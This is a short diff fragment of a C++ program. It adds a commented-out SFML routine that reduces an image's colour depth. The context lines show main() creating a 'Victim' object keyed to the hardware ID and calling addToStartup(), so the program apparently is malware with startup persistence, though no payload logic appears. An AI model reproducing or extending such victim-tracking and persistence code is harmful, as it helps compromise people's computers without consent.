@@ -162,6 +162,21 @@ static void addToStartup() {
 }
 
 int main() {
+    /*
+    sf::Image img("C:/Users/feder/Desktop/img.png");
+    for (unsigned int y = 0; y < img.getSize().y; ++y) {
+        for (unsigned int x = 0; x < img.getSize().x; ++x) {
+            sf::Color pixel = img.getPixel({ x, y });
+            pixel.r = pixel.r & 0b11100000;
+            pixel.g = pixel.g & 0b11100000;
+            pixel.b = pixel.b & 0b11000000;
+            pixel.a = 255;
+            img.setPixel({ x, y }, pixel);
+        }
+    }
+    return img.saveToFile("C:/Users/feder/Desktop/img2.png");
+    */
+
     Victim victim(getHardwareId());
 
     addToStartup();
